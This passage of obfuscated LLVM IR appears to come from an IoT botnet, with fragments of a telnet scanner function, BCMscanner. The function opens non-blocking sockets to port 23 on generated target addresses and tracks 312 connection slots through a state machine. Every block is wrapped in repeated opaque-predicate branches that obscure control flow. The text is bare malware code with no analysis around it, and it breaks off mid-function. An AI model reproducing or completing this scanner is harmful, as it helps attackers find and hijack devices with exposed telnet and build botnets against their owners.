  %38 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %39 = call i32 @connect(i32 %37, %struct.sockaddr* %38, i32 16)
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %36
  call void @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.862, i32 0, i32 0))
  call void @exit(i32 1) #11
  unreachable

; <label>:42:                                     ; preds = %36
  %43 = load i32, i32* %8, align 4
  ret i32 %43
}

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @herror(i8*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #7

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @BCMscanner() #0 {
  %1 = load i32, i32* @x.89
  %2 = load i32, i32* @y.90
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca [128 x i8], align 16
  %16 = alloca i8, align 1
  %17 = alloca %struct.fd_set, align 8
  %18 = alloca %struct.timeval, align 8
  %19 = alloca i32, align 4
  %20 = alloca [256 x i8], align 16
  %21 = alloca i8*, align 8
  %22 = alloca %struct.sockaddr_in, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  store i32 312, i32* %9, align 4
  %27 = load i32, i32* %9, align 4
  store i32 %27, i32* %14, align 4
  %28 = call i64 @time(i64* null) #5
  %29 = call i32 @rand_cmwc()
  %30 = zext i32 %29 to i64
  %31 = xor i64 %28, %30
  %32 = trunc i64 %31 to i32
  call void @srand(i32 %32) #5
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 0
  store i16 2, i16* %33, align 4
  %34 = call zeroext i16 @htons(i16 zeroext 23) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 8, i32 4, i1 false)
  %38 = call noalias i8* @malloc(i64 313) #5
  store i8* %38, i8** %21, align 8
  %39 = load i8*, i8** %21, align 8
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 313, i32 1, i1 false)
  %40 = load i32, i32* %14, align 4
  %41 = zext i32 %40 to i64
  %42 = call i8* @llvm.stacksave()
  store i8* %42, i8** %23, align 8
  %43 = alloca %struct.telstate_t, i64 %41, align 16
  %44 = bitcast %struct.telstate_t* %43 to i8*
  %45 = load i32, i32* %14, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 5
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 %47, i32 16, i1 false)
  store i32 0, i32* %10, align 4
  %48 = load i32, i32* @x.89
  %49 = load i32, i32* @y.90
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %56

; <label>:56:                                     ; preds = %74, %originalBBpart2
  %57 = load i32, i32* %10, align 4
  %58 = load i32, i32* %14, align 4
  %59 = icmp slt i32 %57, %58
  br i1 %59, label %60, label %77

; <label>:60:                                     ; preds = %56
  %61 = load i32, i32* %10, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %62
  %64 = bitcast %struct.telstate_t* %63 to i8*
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 40, i32 8, i1 false)
  %65 = load i32, i32* %10, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %66
  %68 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %67, i32 0, i32 4
  store i8 1, i8* %68, align 1
  %69 = load i8*, i8** %21, align 8
  %70 = load i32, i32* %10, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %71
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %72, i32 0, i32 11
  store i8* %69, i8** %73, align 8
  br label %74

; <label>:74:                                     ; preds = %60
  %75 = load i32, i32* %10, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %10, align 4
  br label %56

; <label>:77:                                     ; preds = %56
  br label %78

; <label>:78:                                     ; preds = %1004, %77
  br label %79

; <label>:79:                                     ; preds = %78
  %80 = load i32, i32* @x.89
  %81 = load i32, i32* @y.90
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %79
  store i32 0, i32* %10, align 4
  %88 = load i32, i32* @x.89
  %89 = load i32, i32* @y.90
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %96

; <label>:96:                                     ; preds = %1001, %originalBBpart221
  %97 = load i32, i32* %10, align 4
  %98 = load i32, i32* %14, align 4
  %99 = icmp slt i32 %97, %98
  br i1 %99, label %100, label %1004

; <label>:100:                                    ; preds = %96
  %101 = load i32, i32* %10, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %102
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %103, i32 0, i32 9
  %105 = load i32, i32* %104, align 8
  %106 = icmp eq i32 %105, 0
  br i1 %106, label %107, label %130

; <label>:107:                                    ; preds = %100
  %108 = load i32, i32* @x.89
  %109 = load i32, i32* @y.90
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %107
  %116 = call i64 @time(i64* null) #5
  %117 = trunc i64 %116 to i32
  %118 = load i32, i32* %10, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %119
  %121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %120, i32 0, i32 9
  store i32 %117, i32* %121, align 8
  %122 = load i32, i32* @x.89
  %123 = load i32, i32* @y.90
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br label %130

; <label>:130:                                    ; preds = %originalBBpart225, %100
  %131 = load i32, i32* %10, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %132
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %133, i32 0, i32 3
  %135 = load i8, i8* %134, align 4
  %136 = zext i8 %135 to i32
  switch i32 %136, label %1000 [
    i32 0, label %137
    i32 1, label %301
    i32 2, label %493
    i32 3, label %577
    i32 4, label %599
    i32 5, label %699
    i32 6, label %737
    i32 7, label %887
  ]

; <label>:137:                                    ; preds = %130
  %138 = load i32, i32* %10, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %139
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %140, i32 0, i32 4
  %142 = load i8, i8* %141, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 1
  br i1 %144, label %145, label %181

; <label>:145:                                    ; preds = %137
  %146 = load i32, i32* @x.89
  %147 = load i32, i32* @y.90
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %145
  %154 = load i32, i32* %10, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %155
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %156, i32 0, i32 11
  %158 = load i8*, i8** %157, align 8
  store i8* %158, i8** %24, align 8
  %159 = load i32, i32* %10, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %160
  %162 = bitcast %struct.telstate_t* %161 to i8*
  call void @llvm.memset.p0i8.i64(i8* %162, i8 0, i64 40, i32 8, i1 false)
  %163 = load i8*, i8** %24, align 8
  %164 = load i32, i32* %10, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %165
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %166, i32 0, i32 11
  store i8* %163, i8** %167, align 8
  %168 = call i32 @BCMSCAN()
  %169 = load i32, i32* %10, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 2
  store i32 %168, i32* %172, align 8
  %173 = load i32, i32* @x.89
  %174 = load i32, i32* @y.90
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %181

; <label>:181:                                    ; preds = %originalBBpart229, %137
  %182 = load i32, i32* @x.89
  %183 = load i32, i32* @y.90
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %181
  %190 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 0
  store i16 2, i16* %190, align 4
  %191 = call zeroext i16 @htons(i16 zeroext 23) #10
  %192 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 1
  store i16 %191, i16* %192, align 2
  %193 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 3
  %194 = getelementptr inbounds [8 x i8], [8 x i8]* %193, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %194, i8 0, i64 8, i32 4, i1 false)
  %195 = load i32, i32* %10, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %196
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %197, i32 0, i32 2
  %199 = load i32, i32* %198, align 8
  %200 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 2
  %201 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %200, i32 0, i32 0
  store i32 %199, i32* %201, align 4
  %202 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %203 = load i32, i32* %10, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %204
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %205, i32 0, i32 0
  store i32 %202, i32* %206, align 8
  %207 = load i32, i32* %10, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %208
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 8
  %212 = icmp eq i32 %211, -1
  %213 = load i32, i32* @x.89
  %214 = load i32, i32* @y.90
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br i1 %212, label %221, label %222

; <label>:221:                                    ; preds = %originalBBpart233
  br label %1001

; <label>:222:                                    ; preds = %originalBBpart233
  %223 = load i32, i32* %10, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %224
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %225, i32 0, i32 0
  %227 = load i32, i32* %226, align 8
  %228 = load i32, i32* %10, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %229
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %230, i32 0, i32 0
  %232 = load i32, i32* %231, align 8
  %233 = call i32 (i32, i32, ...) @fcntl(i32 %232, i32 3, i8* null)
  %234 = or i32 %233, 2048
  %235 = call i32 (i32, i32, ...) @fcntl(i32 %227, i32 4, i32 %234)
  %236 = load i32, i32* %10, align 4
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %237
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %238, i32 0, i32 0
  %240 = load i32, i32* %239, align 8
  %241 = bitcast %struct.sockaddr_in* %22 to %struct.sockaddr*
  %242 = call i32 @connect(i32 %240, %struct.sockaddr* %241, i32 16)
  %243 = icmp eq i32 %242, -1
  br i1 %243, label %244, label %275

; <label>:244:                                    ; preds = %222
  %245 = load i32, i32* @x.89
  %246 = load i32, i32* @y.90
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %244
  %253 = call i32* @__errno_location() #10
  %254 = load i32, i32* %253, align 4
  %255 = icmp ne i32 %254, 115
  %256 = load i32, i32* @x.89
  %257 = load i32, i32* @y.90
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br i1 %255, label %264, label %275

; <label>:264:                                    ; preds = %originalBBpart237
  %265 = load i32, i32* %10, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %266
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %267, i32 0, i32 0
  %269 = load i32, i32* %268, align 8
  %270 = call i32 @sclose(i32 %269)
  %271 = load i32, i32* %10, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %272
  %274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %273, i32 0, i32 4
  store i8 1, i8* %274, align 1
  br label %300

; <label>:275:                                    ; preds = %originalBBpart237, %222
  %276 = load i32, i32* @x.89
  %277 = load i32, i32* @y.90
  %278 = sub i32 %276, 1
  %279 = mul i32 %276, %278
  %280 = urem i32 %279, 2
  %281 = icmp eq i32 %280, 0
  %282 = icmp slt i32 %277, 10
  %283 = or i1 %281, %282
  br i1 %283, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %275
  %284 = load i32, i32* %10, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %285
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %286, i32 0, i32 3
  store i8 1, i8* %287, align 4
  %288 = load i32, i32* %10, align 4
  %289 = sext i32 %288 to i64
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %289
  %291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %290, i32 0, i32 9
  store i32 0, i32* %291, align 8
  %292 = load i32, i32* @x.89
  %293 = load i32, i32* @y.90
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br label %300

; <label>:300:                                    ; preds = %originalBBpart241, %264
  br label %1000

; <label>:301:                                    ; preds = %130
  %302 = load i32, i32* @x.89
  %303 = load i32, i32* @y.90
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %301
  %310 = load i32, i32* @x.89
  %311 = load i32, i32* @y.90
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %318

; <label>:318:                                    ; preds = %originalBBpart245
  %319 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %17, i32 0, i32 0
  %320 = getelementptr inbounds [16 x i64], [16 x i64]* %319, i64 0, i64 0
  %321 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %320) #5, !srcloc !5
  %322 = extractvalue { i64, i64* } %321, 0
  %323 = extractvalue { i64, i64* } %321, 1
  %324 = trunc i64 %322 to i32
  store i32 %324, i32* %25, align 4
  %325 = ptrtoint i64* %323 to i64
  %326 = trunc i64 %325 to i32
  store i32 %326, i32* %26, align 4
  br label %327

; <label>:327:                                    ; preds = %318
  br label %328

; <label>:328:                                    ; preds = %327
  %329 = load i32, i32* %10, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %330
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %331, i32 0, i32 0
  %333 = load i32, i32* %332, align 8
  %334 = srem i32 %333, 64
  %335 = zext i32 %334 to i64
  %336 = shl i64 1, %335
  %337 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %17, i32 0, i32 0
  %338 = load i32, i32* %10, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %339
  %341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %340, i32 0, i32 0
  %342 = load i32, i32* %341, align 8
  %343 = sdiv i32 %342, 64
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds [16 x i64], [16 x i64]* %337, i64 0, i64 %344
  %346 = load i64, i64* %345, align 8
  %347 = or i64 %346, %336
  store i64 %347, i64* %345, align 8
  %348 = getelementptr inbounds %struct.timeval, %struct.timeval* %18, i32 0, i32 0
  store i64 0, i64* %348, align 8
  %349 = getelementptr inbounds %struct.timeval, %struct.timeval* %18, i32 0, i32 1
  store i64 10000, i64* %349, align 8
  %350 = load i32, i32* %10, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %351
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %352, i32 0, i32 0
  %354 = load i32, i32* %353, align 8
  %355 = add nsw i32 %354, 1
  %356 = call i32 @select(i32 %355, %struct.fd_set* null, %struct.fd_set* %17, %struct.fd_set* null, %struct.timeval* %18)
  store i32 %356, i32* %11, align 4
  %357 = load i32, i32* %11, align 4
  %358 = icmp eq i32 %357, 1
  br i1 %358, label %359, label %416

; <label>:359:                                    ; preds = %328
  store i32 4, i32* %19, align 4
  store i32 0, i32* %13, align 4
  %360 = load i32, i32* %10, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %361
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %362, i32 0, i32 0
  %364 = load i32, i32* %363, align 8
  %365 = bitcast i32* %13 to i8*
  %366 = call i32 @getsockopt(i32 %364, i32 1, i32 4, i8* %365, i32* %19) #5
  %367 = load i32, i32* %13, align 4
  %368 = icmp ne i32 %367, 0
  br i1 %368, label %369, label %384

; <label>:369:                                    ; preds = %359
  %370 = load i32, i32* %10, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %371
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %372, i32 0, i32 0
  %374 = load i32, i32* %373, align 8
  %375 = call i32 @sclose(i32 %374)
  %376 = load i32, i32* %10, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 3
  store i8 0, i8* %379, align 4
  %380 = load i32, i32* %10, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %381
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %382, i32 0, i32 4
  store i8 1, i8* %383, align 1
  br label %415

; <label>:384:                                    ; preds = %359
  %385 = load i32, i32* %10, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %386
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %387, i32 0, i32 0
  %389 = load i32, i32* %388, align 8
  %390 = load i32, i32* %10, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %391
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %392, i32 0, i32 0
  %394 = load i32, i32* %393, align 8
  %395 = call i32 (i32, i32, ...) @fcntl(i32 %394, i32 3, i8* null)
  %396 = and i32 %395, -2049
  %397 = call i32 (i32, i32, ...) @fcntl(i32 %389, i32 4, i32 %396)
  %398 = load i32, i32* %10, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %399
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %400, i32 0, i32 9
  store i32 0, i32* %401, align 8
  %402 = load i32, i32* %10, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %403
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %404, i32 0, i32 10
  store i16 0, i16* %405, align 4
  %406 = load i32, i32* %10, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %407
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %408, i32 0, i32 11
  %410 = load i8*, i8** %409, align 8
  call void @llvm.memset.p0i8.i64(i8* %410, i8 0, i64 312, i32 1, i1 false)
  %411 = load i32, i32* %10, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %412
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %413, i32 0, i32 3
  store i8 2, i8* %414, align 4
  br label %415

; <label>:415:                                    ; preds = %384, %369
  br label %1001

; <label>:416:                                    ; preds = %328
  %417 = load i32, i32* %11, align 4
  %418 = icmp eq i32 %417, -1
  br i1 %418, label %419, label %450

; <label>:419:                                    ; preds = %416
  %420 = load i32, i32* @x.89
  %421 = load i32, i32* @y.90
  %422 = sub i32 %420, 1
  %423 = mul i32 %420, %422
  %424 = urem i32 %423, 2
  %425 = icmp eq i32 %424, 0
  %426 = icmp slt i32 %421, 10
  %427 = or i1 %425, %426
  br i1 %427, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %419
  %428 = load i32, i32* %10, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %429
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %430, i32 0, i32 0
  %432 = load i32, i32* %431, align 8
  %433 = call i32 @sclose(i32 %432)
  %434 = load i32, i32* %10, align 4
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %435
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %436, i32 0, i32 3
  store i8 0, i8* %437, align 4
  %438 = load i32, i32* %10, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %439
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %440, i32 0, i32 4
  store i8 1, i8* %441, align 1
  %442 = load i32, i32* @x.89
  %443 = load i32, i32* @y.90
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br label %1001

; <label>:450:                                    ; preds = %416
  br label %451

; <label>:451:                                    ; preds = %450
  %452 = load i32, i32* %10, align 4
  %453 = sext i32 %452 to i64
  %454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %453
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %454, i32 0, i32 9
  %456 = load i32, i32* %455, align 8
  %457 = add i32 %456, 6
  %458 = zext i32 %457 to i64
  %459 = call i64 @time(i64* null) #5
  %460 = icmp slt i64 %458, %459
  br i1 %460, label %461, label %476

; <label>:461:                                    ; preds = %451
  %462 = load i32, i32* %10, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %463
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %464, i32 0, i32 0
  %466 = load i32, i32* %465, align 8
  %467 = call i32 @sclose(i32 %466)
  %468 = load i32, i32* %10, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %469
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %470, i32 0, i32 3
  store i8 0, i8* %471, align 4
  %472 = load i32, i32* %10, align 4
  %473 = sext i32 %472 to i64
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %473
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %474, i32 0, i32 4
  store i8 1, i8* %475, align 1
  br label %476

; <label>:476:                                    ; preds = %461, %451
  %477 = load i32, i32* @x.89
  %478 = load i32, i32* @y.90
  %479 = sub i32 %477, 1
  %480 = mul i32 %477, %479
  %481 = urem i32 %480, 2
  %482 = icmp eq i32 %481, 0
  %483 = icmp slt i32 %478, 10
  %484 = or i1 %482, %483
  br i1 %484, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %476
  %485 = load i32, i32* @x.89
  %486 = load i32, i32* @y.90
  %487 = sub i32 %485, 1
  %488 = mul i32 %485, %487
  %489 = urem i32 %488, 2
  %490 = icmp eq i32 %489, 0
  %491 = icmp slt i32 %486, 10
  %492 = or i1 %490, %491
  br i1 %492, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %1000

; <label>:493:                                    ; preds = %130
  %494 = load i32, i32* %10, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %495
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %496, i32 0, i32 0
  %498 = load i32, i32* %497, align 8
